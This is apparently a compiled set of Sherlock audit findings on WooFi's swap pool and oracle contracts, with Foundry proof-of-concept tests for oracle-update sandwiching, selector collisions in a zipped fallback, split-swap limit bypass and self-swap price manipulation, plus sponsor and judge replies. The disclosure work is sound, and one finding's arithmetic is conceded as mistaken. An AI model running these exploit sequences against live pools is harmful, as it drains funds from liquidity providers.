# Issue H-1: Oracle price updates can be easily sandwiched for atomic profits 

Source: https://github.com/sherlock-audit/2024-03-woofi-swap-judging/issues/17 

The protocol has acknowledged this issue.

## Found by 
mstpr-brainbot
## Summary
When the new price is posted by admin to oracle, any MEV searcher can frontrun/sandwich for atomic profits. Such sandwich would mean loss of funds for the supplier of the tokens.
## Vulnerability Detail
Assume USDC is quote token and WOO is base token. WOO does not have a chainlink price feed which means the pricing of WOO will be handled by the WooOracle solely. 

Also assume that the WOO price is 0.5$. However, in off-chain markets, the price of WOO increases to 0.55$ and the oracle is updated by the admin so the oracle update will make the onchain price 0.5$ -> 0.55$.

MEV bot sees the oracle price update tx in mempool, and quickly buys WOO tokens from the pool contract and then sells it for more USDC after the oracle update is completed. At the end, MEV bot achieved to buy WOO tokens from 0.5$ and managed to sell all for 0.55$ in 1 tx. The profit that the MEV bot made is basically a loss to the provider of the WOO tokens in the pool since the WOO tokens are sold to a price that is cheaper than it should be. 

**Coded PoC:**
```solidity
function test_frontrunOraclePriceUpdate() public {
        uint usdcAmount = 1_000_000 * 1e6;
        uint wooAmount = 100_000 * 1e18;
        deal(USDC, ADMIN, usdcAmount);
        deal(WOO, ADMIN, wooAmount);

        vm.startPrank(ADMIN);
        IERC20(USDC).approve(address(pool), type(uint256).max);
        IERC20(WOO).approve(address(pool), type(uint256).max);
        pool.depositAll(USDC);
        pool.depositAll(WOO);
        vm.stopPrank();

        assertEq(IERC20(USDC).balanceOf(address(pool)), usdcAmount);

        uint usdcAmountForTapir = 10_000 * 1e6;
        vm.startPrank(TAPIR);
        deal(USDC, TAPIR, usdcAmountForTapir);
        IERC20(USDC).approve(address(router), type(uint256).max);
        IERC20(WOO).approve(address(router), type(uint256).max);
        vm.stopPrank();

        // sell USDC for WOO before price update, frontrun, initial price is 0.5
        vm.prank(TAPIR);
        uint receivedWOO = router.swap(USDC, WOO, usdcAmountForTapir, 0, payable(TAPIR), TAPIR);
        console.log("Received WOO", receivedWOO);

        // new price is updated, 0.55
        vm.prank(ADMIN);
        oracle.postPrice(WOO, 0.55 * 1e8);

        // immediately sell back 
        vm.prank(TAPIR);
        uint receivedUSDC = router.swap(WOO, USDC, receivedWOO, 0, payable(TAPIR), TAPIR);
        console.log("Received USDC", receivedUSDC);

        // atomic profit
        assertGe(receivedUSDC, usdcAmountForTapir);
    }
```
## Impact

## Code Snippet
https://github.com/sherlock-audit/2024-03-woofi-swap/blob/65185691c91541e33f84b77d4c6290182f137092/WooPoolV2/contracts/wooracle/WooracleV2_2.sol#L148-L156
https://github.com/sherlock-audit/2024-03-woofi-swap/blob/65185691c91541e33f84b77d4c6290182f137092/WooPoolV2/contracts/WooPPV2.sol#L152-L170
## Tool used

Manual Review

## Recommendation
Add a buffer that whenever the price is updated the buffer amount of time has to be passed.
If the oracle updates at t=0, and buffer is 2seconds then the next swap can happen in t=2 to make sure sandwiching is not possible for MEV bots 



## Discussion

**fb-alexcq**

- wooracle price update is high-frequent
- the newly posted k, spread and swap fee, will make the sandwich swap less or non profitable in most cases.

# Issue M-1: Potential damages due to incorrect implementation of the ````ZIP```` algorithm 

Source: https://github.com/sherlock-audit/2024-03-woofi-swap-judging/issues/13 

The protocol has acknowledged this issue.

## Found by 
KingNFT
## Summary
````WooracleV2_2.fallback()```` is used to post zipped token price and state data to the contract for sake of gas saving. However, the first 4 bytes of zipped data are not reserved to distinguish the ````ZIP```` call and other normal call's function selector.
This would cause  ````ZIP```` calls to be accidentally interpreted as any other functions in the contract, result in unintended exceptions and potential damages.

## Vulnerability Detail
According solidity's official doc, there are two forms of ````fallback()```` function ````with```` or ````without```` parameter
```solidity
fallback () external [payable];
fallback (bytes calldata _input) external [payable] returns (bytes memory _output);
```
reference: https://docs.soliditylang.org/en/v0.8.12/contracts.html#fallback-function
In ````WooracleV2_2```` contract, the second form is used, but the implementation misses an important note from the above doc
>If the version with parameters is used, _input will contain the full data sent to the contract (equal to msg.data) 
  
As the ````_input```` data is equal to ````msg.data````, the solidity compiler would firstly check if first 4 bytes matches any normal function selectors, and would only execute ````fallback(_input)```` while no matching. Therefore, in zipped data, the first 4 bytes must be set to some reserved function selector, such as ````0x00000000````, with no collision to normal function selectors. And the real zipped data then starts from 5th byte.

The following coded PoC shows cases that the zipped data is accidentally interpreted as:

>function renounceOwnership();
>function setStaleDuration(uint256);
>function postPrice(address,uint128);
>function syncTS(uint256);

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "../../lib/forge-std/src/Test.sol";
import {console2} from "../../lib/forge-std/src/console2.sol";
import {WooracleV2_2} from "../../contracts/wooracle/WooracleV2_2.sol";

contract WooracleZipBugTest is Test {
    WooracleV2_2 public oracle;

    function setUp() public {
        oracle = new WooracleV2_2();
    }

    function testNormalCase() public {
        /* reference:
            File: test\typescript\wooraclev2_zip_inherit.test.ts
            97:     function _encode_woo_price() {
            op = 0
            len = 1
            (base, p)
            base: 6, woo token
            price: 0.23020
            23020000 (decimal = 8)
        */
        uint8 base = 6;
        bytes memory zip = _makeZipData({
            op: 0,
            length: 1,
            leadingBytesOfBody: abi.encodePacked(base, uint32((2302 << 5) + 4))
        });
        (bool success, ) = address(oracle).call(zip);
        assertEq(success, true);
        address wooAddr = oracle.getBase(6);
        (uint256 price, bool feasible) = oracle.price(wooAddr);
        assertEq(price, 23020000);
        assertTrue(feasible);
    }

    function testCollisionWithRenounceOwnership() public {
        // selector of "renounceOwnership()": "0x715018a6"
        bytes memory zip = _makeZipData({
            op: 1,
            length: 0x31,
            leadingBytesOfBody: abi.encodePacked(hex"5018a6")
        });
        assertEq(oracle.owner(), address(this));
        (bool success, ) = address(oracle).call(zip);
        assertEq(success, true);
        assertEq(oracle.owner(), address(0));
    }

    function testCollisionWithSetStaleDuration() public {
        // selector of "setStaleDuration(uint256)": "0x99235fd4"
        bytes memory zip = _makeZipData({
            op: 2,
            length: 0x19,
            leadingBytesOfBody: abi.encodePacked(hex"235fd4")
        });
        assertEq(oracle.staleDuration(), 120); // default: 2 mins
        (bool success, ) = address(oracle).call(zip);
        assertEq(success, true);
        uint256 expectedStaleDuration;
        assembly {
            expectedStaleDuration := mload(add(zip, 36))
        }
        assertEq(oracle.staleDuration(), expectedStaleDuration);
        assertTrue(expectedStaleDuration != 120);
    }

    function testCollisionWithPostPrice() public {
        // selector of "postPrice(address,uint128)": "0xd5bade07"
        bytes memory addressAndPrice = abi.encode(address(0x1111), uint256(100));
        bytes memory zip = _makeZipData({
            op: 3,
            length: 0x15,
            leadingBytesOfBody: abi.encodePacked(hex"bade07", addressAndPrice)
        });
        (bool success, ) = address(oracle).call(zip);
        assertEq(success, true);
        (uint256 price, bool feasible) = oracle.price(address(0x1111));
        assertEq(price, 100);
        assertTrue(feasible);
    }

    function testCollisionWithSyncTS() public {
        // selector of "syncTS(uint256)": "4f1f1999"
        uint256 timestamp = 12345678;
        bytes memory zip = _makeZipData({
            op: 1,
            length: 0xf,
            leadingBytesOfBody: abi.encodePacked(hex"1f1999", timestamp)
        });
        (bool success, ) = address(oracle).call(zip);
        assertEq(success, true);
        assertEq(oracle.timestamp(), timestamp);
    }

    function _makeZipData(
        uint8 op,
        uint8 length,
        bytes memory leadingBytesOfBody
    ) internal returns (bytes memory result) {
        assertTrue(length < 2 ** 6);
        assertTrue(op < 4);
        bytes1 head = bytes1(uint8((op << 6) + (length & 0x3F)));
        uint256 sizeOfItem = op == 0 || op == 2 ? 5 : 13;
        uint256 sizeOfHead = 1;
        uint256 sizeOfBody = sizeOfItem * length;
        assertTrue(sizeOfBody >= leadingBytesOfBody.length);
        result = bytes.concat(head, leadingBytesOfBody, _makePseudoRandomBytes(sizeOfBody - leadingBytesOfBody.length));
        assertEq(result.length, sizeOfHead + sizeOfBody);
    }

    function _makePseudoRandomBytes(uint256 length) internal returns (bytes memory result) {
        uint256 words = (length + 31) / 32;
        result = new bytes(words * 32);
        for (uint256 i; i < words; ++i) {
            bytes32 rand = keccak256(abi.encode(block.timestamp + i));
            assembly {
                mstore(add(add(result, 32), mul(i, 32)), rand)
            }
        }

        assembly {
            mstore(result, length) // change to required length
        }
        assertEq(length, result.length);
    }
}

```

And the logs:
```solidity
2024-03-woofi-swap\WooPoolV2> forge test --match-contract WooracleZipBugTest -vv
[⠢] Compiling...No files changed, compilation skipped
[⠆] Compiling...

Running 5 tests for test/foundry/WooracleZipBug.t.sol:WooracleZipBugTest
[PASS] testCollisionWithPostPrice() (gas: 48643)
[PASS] testCollisionWithRenounceOwnership() (gas: 21301)
[PASS] testCollisionWithSetStaleDuration() (gas: 18289)
[PASS] testCollisionWithSyncTS() (gas: 35302)
[PASS] testNormalCase() (gas: 48027)
Test result: ok. 5 passed; 0 failed; 0 skipped; finished in 2.13ms

Ran 1 test suites: 5 tests passed, 0 failed, 0 skipped (5 total tests)
```


## Impact
This bug would result in unintended exceptions and potential damages such as:
1) Collision with normal price post functions might cause users' trades executed on incorrect price and suffer losses.
2) Collision with any view function might cause price post to fail silently and hold on trade processing until next submission, and users' trades might be executed on a delayed inexact price.
3) Collision with ````setStaleDuration()```` might cause price freshness check to break down.

## Code Snippet
https://github.com/sherlock-audit/2024-03-woofi-swap/blob/main/WooPoolV2/contracts/wooracle/WooracleV2_2.sol#L394

## Tool used

Manual Review

## Recommendation
```diff
diff --git a/WooPoolV2/contracts/wooracle/WooracleV2_2.sol b/WooPoolV2/contracts/wooracle/WooracleV2_2.sol
index 9e66c63..4a9138f 100644
--- a/WooPoolV2/contracts/wooracle/WooracleV2_2.sol
+++ b/WooPoolV2/contracts/wooracle/WooracleV2_2.sol
@@ -416,9 +416,10 @@ contract WooracleV2_2 is Ownable, IWooracleV2 {
         */

         uint256 x = _input.length;
-        require(x > 0, "WooracleV2_2: !calldata");
+        require(x > 4, "WooracleV2_2: !calldata");
+        require(bytes4(_input[0:4]) == bytes4(hex"00000000"));

-        uint8 firstByte = uint8(bytes1(_input[0]));
+        uint8 firstByte = uint8(bytes1(_input[5]));
         uint8 op = firstByte >> 6; // 11000000
         uint8 len = firstByte & 0x3F; // 00111111

@@ -428,12 +429,12 @@ contract WooracleV2_2 is Ownable, IWooracleV2 {
             uint128 p;

             for (uint256 i = 0; i < len; ++i) {
-                base = getBase(uint8(bytes1(_input[1 + i * 5:1 + i * 5 + 1])));
-                p = _decodePrice(uint32(bytes4(_input[1 + i * 5 + 1:1 + i * 5 + 5])));
+                base = getBase(uint8(bytes1(_input[5 + i * 5:5 + i * 5 + 1])));
+                p = _decodePrice(uint32(bytes4(_input[5 + i * 5 + 1:5 + i * 5 + 5])));
                 infos[base].price = p;
             }

-            timestamp = (op == 0) ? block.timestamp : uint256(uint32(bytes4(_input[1 + len * 5:1 + len * 5 + 4])));
+            timestamp = (op == 0) ? block.timestamp : uint256(uint32(bytes4(_input[5 + len * 5:5 + len * 5 + 4])));
         } else if (op == 1 || op == 3) {
             // post states list
             address base;
@@ -442,14 +443,14 @@ contract WooracleV2_2 is Ownable, IWooracleV2 {
             uint64 k;

             for (uint256 i = 0; i < len; ++i) {
-                base = getBase(uint8(bytes1(_input[1 + i * 9:1 + i * 9 + 1])));
-                p = _decodePrice(uint32(bytes4(_input[1 + i * 9 + 1:1 + i * 9 + 5])));
-                s = _decodeKS(uint16(bytes2(_input[1 + i * 9 + 5:1 + i * 9 + 7])));
-                k = _decodeKS(uint16(bytes2(_input[1 + i * 9 + 7:1 + i * 9 + 9])));
+                base = getBase(uint8(bytes1(_input[5 + i * 9:5 + i * 9 + 1])));
+                p = _decodePrice(uint32(bytes4(_input[5 + i * 9 + 1:5 + i * 9 + 5])));
+                s = _decodeKS(uint16(bytes2(_input[5 + i * 9 + 5:5 + i * 9 + 7])));
+                k = _decodeKS(uint16(bytes2(_input[5 + i * 9 + 7:5 + i * 9 + 9])));
                 _setState(base, p, s, k);
             }

-            timestamp = (op == 1) ? block.timestamp : uint256(uint32(bytes4(_input[1 + len * 9:1 + len * 9 + 4])));
+            timestamp = (op == 1) ? block.timestamp : uint256(uint32(bytes4(_input[5 + len * 9:5 + len * 9 + 4])));
         } else {
             revert("WooracleV2_2: !op");
         }
```



## Discussion

**fb-alexcq**

- First your suggested issue right; it may have function collisions. Thanks for pointing it out.
- More importantly, the frequency is negligible. We have 30 functions there, so collision probability is 30/(2^32) = 0.000000006984919;  We typically update our Wooracle in 5 seconds, so a collision only happen once every 1000,000,000 seconds , that is 31 years: https://calculat.io/en/date/seconds/1000000000
- From engineering perspective: we utilize this zip fallback function to save calldata's gas consumption, so it's impossible to add another plain 4 bytes to only avoid collision. Even with collusion, our offline script can catch the tx failure and resend it again, it won't cause any disaster.

# Issue M-2: Selling partial base tokens are more profitable then selling in one go 

Source: https://github.com/sherlock-audit/2024-03-woofi-swap-judging/issues/20 

The protocol has acknowledged this issue.

## Found by 
Bandit, mstpr-brainbot
## Summary
Selling base tokens partially instead of one go is always more profitable 
## Vulnerability Detail
First, let's write down our formulas of sellBase tokens for quoteTokens:
g: gamma
s: spread
c: coefficient
p: price
np: new price (price after selling base tokens) 

**g = deltaBase * p * c**
**deltaQuote = deltaBase * p * (1 - (g + s))**
**np = p * (1 - g)**

Code snippet for the above formulas:
https://github.com/sherlock-audit/2024-03-woofi-swap/blob/65185691c91541e33f84b77d4c6290182f137092/WooPoolV2/contracts/WooPPV2.sol#L591-L619

Here I graphed both `sellQuote` and `sellBase` functions:
https://www.desmos.com/calculator/svmjlxhavw

As we can observe, if the price is >1 then the selling base tokens (red in the graph) will start decreasing after it reaches the middle value. Same happens vice versa when price is <1 for selling quote tokens (blue in the graph). This heavily incentivise smaller swaps and heavily disincentives bigger swaps. Also, since selling smaller amounts are ALWAYS more profitable, `maxGamma` and `maxNotionalSwap` values can be bypassed without a loss (even for profits) 

**Textual PoC:**
Now, let's do a textual example to see whether selling 20 base tokens is profitable then selling 2 times 10 base tokens
For this example, let's assume:
p = 1
c = 0.01
s = 0.1 
and there are no swap fees for simplicity.

First, let's sell 20 base tokens:
g = 20 * 1 * 0.01 = 0.2
deltaQuote = 20 * 1 * (1 - (0.1 + 0.1)) = 14
**quote tokens received will be 14**

Now, let's sell 10 base tokens in 2 times in a single transaction:
g1 = 10 * 1 * 0.01 = 0.1
deltaQuote1 = 10 * 1 * (1- (0.1 + 0.1)) = 8
np = 1 * (1 - 0.1) = 0.9
**received 8 quote tokens in first sell of 10 base tokens**

g2 = 10 * 0.9 * 0.01 = 0.09
deltaQuote2 = 10 * 0.9 * (1 - (0.1 + 0.09)) = 7.29
**received 7.29 quote tokens in second sell of 10 base tokens**

**in total 7.29 + 8 = 15.29 quote tokens received! however, if we were to swap 10 tokens in one go we would end up with 14 quote tokens!** 

This also means that swaps that are not possible because of `maxNotionalSwap` can be divided into partial swaps and the end result would be even higher!
If the `maxNotionalSwap` is 100K USDC, someone can swap 2 times 50K USDC to receive even higher amount of quote tokens! Hence, the exploit that happent to WooFi would still be possible and even worse since the partial swaps are better than single go.

Here a test where it compares selling 1000 WETH in one go, 500-500 and 1-1-1-... 1000 times in a single tx:
```solidity
// @dev fee is "100", coeff = 0.000000001 * 1e18, spread = 0.001 * 1e18 as in the tests
    // setting fee to a different value is not relevant, attack is still there, just slighly less profitable
    
    // @dev sell 1000 in single tx
    function test_SellBase1Part() public {
        uint sellWethAmount = 1000 * 1e18;
        _fundAndApproveAdminAndTapir(1000_0000 * 1e6, sellWethAmount);

        vm.prank(TAPIR);
        uint receivedUSDC = router.swap(WETH, USDC, sellWethAmount, 0, payable(TAPIR), TAPIR);

        console.log("Received USDC", receivedUSDC);
        console.log("contract usdc balance", IERC20(USDC).balanceOf(address(pool)));
    }

    // @dev sell 500-500 in single tx
    function test_Sell2Parts() public {
        uint sellWethAmount = 1000 * 1e18;
        _fundAndApproveAdminAndTapir(1000_0000 * 1e6, sellWethAmount);
        
        uint cumulative;
        for (uint i; i < 2; ++i) {
            // sell 5 wei dust
            vm.prank(TAPIR);
            uint receivedUSDC = router.swap(WETH, USDC, sellWethAmount / 2, 0, payable(TAPIR), TAPIR);
            (uint128 price, ) = oracle.woPrice(WETH);
            cumulative += receivedUSDC;
        }

        console.log("Received USDC", cumulative);
        console.log("contract usdc balance", IERC20(USDC).balanceOf(address(pool)));
    }

    // @dev sell 1-1-1-1.... in single tx
    function test_Sell1000Parts() public {
        uint sellWethAmount = 1000 * 1e18;
        _fundAndApproveAdminAndTapir(1000_0000 * 1e6, sellWethAmount);
        
        uint cumulative;
        for (uint i; i < 1000; ++i) {
            // sell 5 wei dust
            vm.prank(TAPIR);
            uint receivedUSDC = router.swap(WETH, USDC, sellWethAmount / 1000, 0, payable(TAPIR), TAPIR);
            (uint128 price, ) = oracle.woPrice(WETH);
            cumulative += receivedUSDC;
        }

        console.log("Received USDC", cumulative);
        console.log("contract usdc balance", IERC20(USDC).balanceOf(address(pool)));
    }
```

**Results:**
Selling 500-500 instead of 1000 in one go: 3395.800042 USDC more received
Selling 1-1-1-1-... 1000 times instead 1000 in one go: 6776.505788 USDC more received! 

## Impact
Breaking the `maxNotionalSwap` amount and unfair AMM model
## Code Snippet

## Tool used

Manual Review

## Recommendation





## Discussion

**fb-alexcq**

Thanks for the feedback. This is a known scope when designing our SPMM formula. Again we want to follow up with:
1. Seems like you're not considering the swap fee
2. Split into multiple small swaps, only can save users from huge slippage, but it won't cause our protocol lose funds, right?  1000 times for 1 each looks like still not profitable to the attacker, right?

**mstpr**

The protocol will not lose funds, correct. However, the maxGamma and maxNotionalSwap variables will be rendered useless since partial swaps can be used to bypass these checks, making it even profitable to do so.



**fb-alexcq**

This extreme price-deviation case has already been handled by price check (against Chainlink) in our Wooracle's `price` function.

**WangSecurity**

Initially, it was a duplicate of 68, but these are different issues and it presents an unfair formule, therefore, we decided to keep this one as valid.

**WangSecurity**

Sponsor said that this AMM model is in fact intended, cause 99% of their swaps are small. But, it wasn't mentioned in the README, therefore, we validate this report as Med due to validation of maxGamma and maxNotionalSwap (core functionality break).

# Issue M-3: Price manipulation by swapping any ````baseToken```` with itself 

Source: https://github.com/sherlock-audit/2024-03-woofi-swap-judging/issues/32 

## Found by 
Ironsidesec, KingNFT, klaus
## Summary
````WooPPV2.swap()```` doesn't forbid the case that ````fromToken == toToken == baseToken````, attackers can make any ````baseToken````'s price unboundedly drifting away by swapping with self.

## Vulnerability Detail
The issue arises due to incorrect logic in ````WooPPV2._swapBaseToBase()````:
1. Firstly, we can see the situation that ````fromToken == toToken == baseToken```` can pass the checks on L521\~L522.
2. ````baseToken````'s state & price is cached in memory on L527\~L528, and updated first time on L541, but the price calculation on L555 still uses the cached state, and the ````newBase2Price```` is set to ````wooracle```` on L556 as the final price after the swap.

As a result, swapping ````baseToken```` with itself will cause a net price drift rather than keeping price unchanged.
```solidity
File: contracts\WooPPV2.sol
513:     function _swapBaseToBase(
...
520:     ) private nonReentrant whenNotPaused returns (uint256 base2Amount) {
521:         require(baseToken1 != address(0) && baseToken1 != quoteToken, "WooPPV2: !baseToken1");
522:         require(baseToken2 != address(0) && baseToken2 != quoteToken, "WooPPV2: !baseToken2");
...
527:         IWooracleV2.State memory state1 = IWooracleV2(wooracle).state(baseToken1);
528:         IWooracleV2.State memory state2 = IWooracleV2(wooracle).state(baseToken2);
...
539:             uint256 newBase1Price;
540:             (quoteAmount, newBase1Price) = _calcQuoteAmountSellBase(baseToken1, base1Amount, state1);
541:             IWooracleV2(wooracle).postPrice(baseToken1, uint128(newBase1Price));
...
554:             uint256 newBase2Price;
555:             (base2Amount, newBase2Price) = _calcBaseAmountSellQuote(baseToken2, quoteAmount, state2);
556:             IWooracleV2(wooracle).postPrice(baseToken2, uint128(newBase2Price));
...
578:     }

```

The following coded PoC intuitively shows the problem with a specific case:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "../../lib/forge-std/src/Test.sol";
import {console2} from "../../lib/forge-std/src/console2.sol";
import {WooracleV2_2} from "../../contracts/wooracle/WooracleV2_2.sol";
import {WooPPV2} from "../../contracts/WooPPV2.sol";
import {TestERC20Token} from "../../contracts/test/TestERC20Token.sol";
import {TestUsdtToken} from "../../contracts/test/TestUsdtToken.sol";

contract TestWbctToken is TestERC20Token {
    function decimals() public view virtual override returns (uint8) {
        return 8;
    }
}

contract PriceManipulationAttackTest is Test {
    WooracleV2_2 oracle;
    WooPPV2 pool;
    TestUsdtToken usdt;
    TestWbctToken wbtc;
    address evil = address(0xbad);

    function setUp() public {
        usdt = new TestUsdtToken();
        wbtc = new TestWbctToken();
        oracle = new WooracleV2_2();
        pool = new WooPPV2(address(usdt));

        // parameters reference: Integration_WooPP_Fee_Rebate_Vault.test.ts
        pool.setMaxGamma(address(wbtc), 0.1e18);
        pool.setMaxNotionalSwap(address(wbtc), 5_000_000e6);
        pool.setFeeRate(address(wbtc), 25);
        oracle.postState({_base: address(wbtc), _price: 50_000e8, _spread: 0.001e18, _coeff: 0.000000001e18});
        oracle.setWooPP(address(pool));
        oracle.setAdmin(address(pool), true);
        pool.setWooracle(address(oracle));

        // add some initial liquidity
        usdt.mint(address(this), 10_000_000e6);
        usdt.approve(address(pool), type(uint256).max);
        pool.depositAll(address(usdt));

        wbtc.mint(address(this), 100e8);
        wbtc.approve(address(pool), type(uint256).max);
        pool.depositAll(address(wbtc));
    }

    function testMaxPriceDriftInNormalCase() public {
        (uint256 initPrice, bool feasible) = oracle.price(address(wbtc));
        assertTrue(feasible);
        assertEq(initPrice, 50_000e8);

        // buy almost all wbtc in pool
        usdt.mint(address(this), 5_000_000e6);
        usdt.transfer(address(pool), 5_000_000e6);
        pool.swap({
            fromToken: address(usdt),
            toToken: address(wbtc),
            fromAmount: 5_000_000e6,
            minToAmount: 0,
            to: address(this),
            rebateTo: address(this)
        });

        (uint256 pastPrice, bool feasible2) = oracle.price(address(wbtc));
        assertTrue(feasible2);
        uint256 drift = ((pastPrice - initPrice) * 1e5) / initPrice;
        assertEq(drift, 502); // 0.502%
        console2.log("Max price drift in normal case: ", _toPercentString(drift));
    }

    function testUnboundPriceDriftInAttackCase() public {
        (uint256 initPrice, bool feasible) = oracle.price(address(wbtc));
        assertTrue(feasible);
        assertEq(initPrice, 50_000e8);

        // top up the evil, in real case, the fund could be from a flashloan
        wbtc.mint(evil, 100e8);

        for (uint256 i; i < 10; ++i) {
            vm.startPrank(evil);
            uint256 balance = wbtc.balanceOf(evil);
            wbtc.transfer(address(pool), balance);
            pool.swap({
                fromToken: address(wbtc),
                toToken: address(wbtc),
                fromAmount: balance,
                minToAmount: 0,
                to: evil,
                rebateTo: evil
            });
            (uint256 pastPrice, bool feasible2) = oracle.price(address(wbtc));
            assertTrue(feasible2);
            uint256 drift = ((pastPrice - initPrice) * 1e5) / initPrice;
            console2.log("Unbound price drift in attack case: ", _toPercentString(drift));    
            vm.stopPrank();
        }
    }

    function _toPercentString(uint256 drift) internal pure returns (string memory result) {
        uint256 d_3 = drift % 10;
        uint256 d_2 = (drift / 10) % 10;
        uint256 d_1 = (drift / 100) % 10;
        uint256 d0 = (drift / 1000) % 10;
        result = string.concat(_toString(d0), ".", _toString(d_1), _toString(d_2), _toString(d_3), "%");
        uint256 d = drift / 10000;
        while (d > 0) {
            result = string.concat(_toString(d % 10), result);
            d = d / 10;
        }
    }

    function _toString(uint256 digital) internal pure returns (string memory str) {
        str = new string(1);
        bytes16 symbols = "0123456789abcdef";
        assembly {
            mstore8(add(str, 32), byte(digital, symbols))
        }
    }
}
```

And the logs:
```solidity
2024-03-woofi-swap\WooPoolV2> forge test --match-contract PriceManipulationAttackTest -vv
[⠆] Compiling...No files changed, compilation skipped
[⠰] Compiling...

Running 2 tests for test/foundry/PriceManipulationAttack.t.sol:PriceManipulationAttackTest
[PASS] testMaxPriceDriftInNormalCase() (gas: 158149)
Logs:
  Max price drift in normal case:  0.502%

[PASS] testUnboundPriceDriftInAttackCase() (gas: 648243)
Logs:
  Unbound price drift in attack case:  0.499%
  Unbound price drift in attack case:  0.998%
  Unbound price drift in attack case:  1.496%
  Unbound price drift in attack case:  1.994%
  Unbound price drift in attack case:  2.491%
  Unbound price drift in attack case:  2.988%
  Unbound price drift in attack case:  3.483%
  Unbound price drift in attack case:  3.978%
  Unbound price drift in attack case:  4.473%
  Unbound price drift in attack case:  4.967%

Test result: ok. 2 passed; 0 failed; 0 skipped; finished in 6.59ms

Ran 1 test suites: 2 tests passed, 0 failed, 0 skipped (2 total tests)
```


## Impact
Acccording ````WooFI```` doc (https://learn.woo.org/v/woofi-dev-docs/resources/on-chain-price-feeds), the ````Wooracle```` is intended to work as a price feed infrastructure for both ````WooFI````'s other components and third parties. This bug would cause all related consumer APPs suffering potential price manipulation attack.

## Code Snippet
https://github.com/sherlock-audit/2024-03-woofi-swap/blob/main/WooPoolV2/contracts/WooPPV2.sol#L513

## Tool used

Manual Review

## Recommendation

```diff
2024-03-woofi-swap\WooPoolV2> git diff
diff --git a/WooPoolV2/contracts/WooPPV2.sol b/WooPoolV2/contracts/WooPPV2.sol
index e7a6ae8..9440089 100644
--- a/WooPoolV2/contracts/WooPPV2.sol
+++ b/WooPoolV2/contracts/WooPPV2.sol
@@ -520,6 +520,7 @@ contract WooPPV2 is Ownable, ReentrancyGuard, Pausable, IWooPPV2 {
     ) private nonReentrant whenNotPaused returns (uint256 base2Amount) {
         require(baseToken1 != address(0) && baseToken1 != quoteToken, "WooPPV2: !baseToken1");
         require(baseToken2 != address(0) && baseToken2 != quoteToken, "WooPPV2: !baseToken2");
+        require(baseToken1 != baseToken2, "WooPPV2: baseToken1 == baseToken2");
         require(to != address(0), "WooPPV2: !to");

         require(balance(baseToken1) - tokenInfos[baseToken1].reserve >= base1Amount, "WooPPV2: !BASE1_BALANCE");
```



## Discussion

**sherlock-admin4**

The protocol team fixed this issue in PR/commit https://github.com/woonetwork/WooPoolV2/pull/110.

**WangSecurity**

request poc

**sherlock-admin2**

PoC request not allowed.

**WangSecurity**

We decided to downgrade it to med cause the cost of such attack is extremely high.

# Issue M-4: WooFi oracle can fail to validate its price with Chainlink price feed 

Source: https://github.com/sherlock-audit/2024-03-woofi-swap-judging/issues/41 

## Found by 
Avci, Bandit, Dliteofficial, infect3d, klaus, mstpr-brainbot
## Summary
The price precision that the WooOracle uses is 8. However, if the quote token is an expensive token or the base token is a very cheap token, then the price will be too less in decimals and even "0" in some cases. This will lead to inefficient trades or inability to compare the woofi price with chainlink price due to chainlink price return with "0" value. 
## Vulnerability Detail
First, let's see how the chainlink price is calculated:
```solidity
function _cloPriceInQuote(address _fromToken, address _toToken)
        internal
        view
        returns (uint256 refPrice, uint256 refTimestamp)
    {
        address baseOracle = clOracles[_fromToken].oracle;
        if (baseOracle == address(0)) {
            return (0, 0);
        }
        address quoteOracle = clOracles[_toToken].oracle;
        uint8 quoteDecimal = clOracles[_toToken].decimal;

        (, int256 rawBaseRefPrice, , uint256 baseUpdatedAt, ) = AggregatorV3Interface(baseOracle).latestRoundData();
        (, int256 rawQuoteRefPrice, , uint256 quoteUpdatedAt, ) = AggregatorV3Interface(quoteOracle).latestRoundData();
        uint256 baseRefPrice = uint256(rawBaseRefPrice);
        uint256 quoteRefPrice = uint256(rawQuoteRefPrice);

        // NOTE: Assume wooracle token decimal is same as chainlink token decimal.
        uint256 ceoff = uint256(10)**quoteDecimal;
        refPrice = (baseRefPrice * ceoff) / quoteRefPrice;
        refTimestamp = baseUpdatedAt >= quoteUpdatedAt ? quoteUpdatedAt : baseUpdatedAt;
    }
```

Now, let's assume the quote token is WBTC price of 60,000$ and the baseToken is tokenX that has the price of 0.0001$. When the final price is calculated at`refPrice` because of the divisions in solidity, the result will be "0" as follows:
60_000 * 1e8 * 1e8 / 0.0001 * 1e8
= 0

so the return amount will be "0".

When the derived chainlink price is compared with woofi oracle if the chainlink price is "0" then the `woPriceInBound` will be set to "true" assuming the chainlink price is not set. However, in our case that's not the case, the price returnt "0" because of divisions:
```solidity
-> bool woPriceInBound = cloPrice_ == 0 ||
            ((cloPrice_ * (1e18 - bound)) / 1e18 <= woPrice_ && woPrice_ <= (cloPrice_ * (1e18 + bound)) / 1e18);

        if (woFeasible) {
            priceOut = woPrice_;
            feasible = woPriceInBound;
        }
```

In such scenario, the chainlink comparison between woofi and chainlink price will not give correct results. The oracle will not be able to detect whether the chainlink price is in "bound" with the woofi's returnt price. 

This also applies if a baseToken price crushes. If the token price gets very less due to market, regardless of the quoteToken being WBTC or USDC the above scenario can happen.
## Impact
Oracle will fail to do a validation of its price with the chainlink price. 
## Code Snippet
https://github.com/sherlock-audit/2024-03-woofi-swap/blob/65185691c91541e33f84b77d4c6290182f137092/WooPoolV2/contracts/wooracle/WooracleV2_2.sol#L348-L369

https://github.com/sherlock-audit/2024-03-woofi-swap/blob/65185691c91541e33f84b77d4c6290182f137092/WooPoolV2/contracts/wooracle/WooracleV2_2.sol#L243-L261
## Tool used

Manual Review

## Recommendation
Precision of "8" is not enough on most of the cases. I'd suggest return the oracle price in "18" decimals to get more room on rounding.



## Discussion

**sherlock-admin3**

1 comment(s) were left on this issue during the judging contest.

**WangAudit** commented:
> the calculation is incorrect; turn on the terminal; start chisel; copy+paste the calculation (60000 * 1e8 * 1e8) / (0.0001 * 1e8) (added brackets so it will be calculated correctly) and the answer is indeed 60000000000000000 (60_000e12 which is correct) and not 0



**fb-alexcq**

Thanks for filing this issue.

Our WooPP only selects the mainstream tokens (actually, only native, btc, usdc, usdt), so it won't face this extreme case. And it's not engineering efficient to update price decimal to `18` for the impossible case above.

**WangSecurity**

Firstly, here's a comment from tapir:

I made a typo in math calculation. I say quote token is wbtc and base token is a token with low price but doing the math opposite. @Wang Security  comment is right here because of my typo. 

the price is:
(baseRefPrice * ceoff) / quoteRefPrice;

